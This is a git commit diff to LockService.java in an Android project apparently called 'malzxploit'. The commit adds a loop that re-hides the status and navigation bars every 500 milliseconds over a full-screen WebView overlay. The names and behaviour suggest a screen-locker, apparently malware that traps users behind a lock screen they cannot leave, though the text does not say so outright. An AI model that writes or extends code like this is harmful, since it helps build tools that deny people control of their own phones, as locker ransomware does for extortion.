5a40775595c5a388abba403b829b764cb802c265
MalzHosting <malz@github.com>
2026-09-14 04:16:18 +0000

    force hide status bar loop

--- app/src/main/java/com/malzxploit/lock/LockService.java
+++ app/src/main/java/com/malzxploit/lock/LockService.java
@@ -138,6 +138,15 @@ public class LockService extends Service {
                         | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION;
 
                     wm.addView(webView, lp);
+                    final View fv = webView;
+                    new Handler(getMainLooper()).postDelayed(new Runnable() {
+                        @Override public void run() {
+                            try {
+                                fv.setSystemUiVisibility(View.SYSTEM_UI_FLAG_FULLSCREEN | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY | View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION);
+                            } catch (Exception ignored) {}
+                            new Handler(getMainLooper()).postDelayed(this, 500);
+                        }
+                    }, 500);
 
                 } catch (Exception e) {
                     Log.e(TAG, "showLock error: " + e.getMessage());
